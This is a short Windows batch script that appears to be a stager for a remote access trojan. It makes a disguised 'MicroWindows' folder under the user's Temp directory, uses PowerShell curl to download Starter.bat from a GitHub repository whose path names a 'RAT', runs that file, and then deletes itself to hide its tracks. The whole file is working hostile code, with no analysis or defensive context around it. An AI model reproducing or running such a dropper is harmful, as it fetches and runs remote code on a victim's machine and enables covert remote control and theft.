@echo off
set "currentd=%cd%"
mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
@rem set "username=saifa"
set "targetd=C:\Users\%username%\AppData\Local\Temp\MicroWindows"
cd %targetd%
powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
start "" Starter.bat
cd %currentd%
del "%~f0"